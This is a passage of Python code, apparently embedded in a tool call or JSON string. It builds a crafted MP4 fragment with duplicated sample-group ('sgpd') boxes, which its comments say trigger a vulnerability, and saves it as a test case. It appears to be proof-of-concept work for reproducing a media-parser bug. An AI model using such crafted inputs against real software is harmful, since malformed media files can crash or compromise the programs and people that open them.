ck(\'>Q\', 0)  # baseMediaDecodeTime\n    traf_data += write_fullbox(b\'tfdt\', 1, 0, tfdt_data)\n    \n    # sgpd (Sample Group Description) - THIS IS KEY FOR THE VULNERABILITY\n    # We create an sgpd with grouping_type and entries that will be allocated\n    sgpd_data = struct.pack(\'>I\', 0x72617020)  # grouping_type = \'rap \' (random access point)\n    sgpd_data += struct.pack(\'>I\', 1)  # entry_count = 1\n    # Entry data for \'rap \' type (minimal)\n    sgpd_data += struct.pack(\'>BB\', 0, 0)  # num_leading_samples_known=0, num_leading_samples=0\n    traf_data += write_fullbox(b\'sgpd\', 1, 0, sgpd_data)\n    \n    # Add another sgpd to trigger comparison logic\n    sgpd_data2 = struct.pack(\'>I\', 0x72617020)  # grouping_type = \'rap \'\n    sgpd_data2 += struct.pack(\'>I\', 1)  # entry_count = 1\n    sgpd_data2 += struct.pack(\'>BB\', 0, 0)\n    traf_data += write_fullbox(b\'sgpd\', 1, 0, sgpd_data2)\n    \n    # trun (Track Fragment Run)\n    trun_flags = 0x000001  # data-offset-present\n    trun_data = struct.pack(\'>I\', 1)  # sample_count\n    trun_data += struct.pack(\'>I\', 8)  # data_offset\n    traf_data += write_fullbox(b\'trun\', 0, trun_flags, trun_data)\n    \n    moof_data += write_box(b\'traf\', traf_data)\n    f.write(write_box(b\'moof\', moof_data))\n    \n    # mdat (Media Data)\n    mdat_data = b\'\\x00\' * 100  # dummy sample data\n    f.write(write_box(b\'mdat\', mdat_data))\n\nprint(f"Generated test case at {output_path}")\n'}
